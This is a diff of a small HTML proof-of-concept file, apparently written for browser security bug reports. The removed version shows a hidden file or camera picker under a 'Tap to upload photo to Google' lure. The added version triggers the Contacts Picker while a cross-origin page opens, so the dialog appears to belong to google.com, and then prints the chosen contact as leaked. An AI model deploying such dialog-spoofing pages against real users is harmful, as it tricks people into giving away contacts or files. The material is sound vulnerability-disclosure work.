@@ -1,47 +1,28 @@
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<style>
-    h1 {
-        margin: 1em;
-    }
-
-    a {
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-    }
-
-    input {
-        display: none;
-    }
-
-    img {
-        width: 100%;
-    }
-</style>
-
-<h1>Tap to upload photo to Google</h1>
-
-<!-- [poc-with-system-dialog]: -->
-<input id="fileSelect" type="file" accept="image/*" />
-
-<!-- [poc-with-camera]: -->
-<!-- <input id="fileSelect" type="file" accept="*/*" /> -->
-
-<img id="img">
-<a id="link" target="_blank"></a>
-
-<script>
-    link.onclick = () => {	
-
-        fileSelect.click();	
-        window.open('https://permission.site');
-
-    }
-
-    fileSelect.onchange = (event) => {
-        img.src = URL.createObjectURL(fileSelect.files[0]);
-    }
-</script>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>PoC</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    let contacts = await navigator.contacts.select(["name"], {});
+                    document.write(`
+                        <h1>
+                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
+                        </h1>
+                    `);
+                })();
+                open("https://www.google.com", "PoC", "_blank");
+            }
+        </script>
+    </head>  
+    <body>
+        <br><br><br>
+        <center>
+            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
+        </center>
+    </body>
+  </body>
+</html>
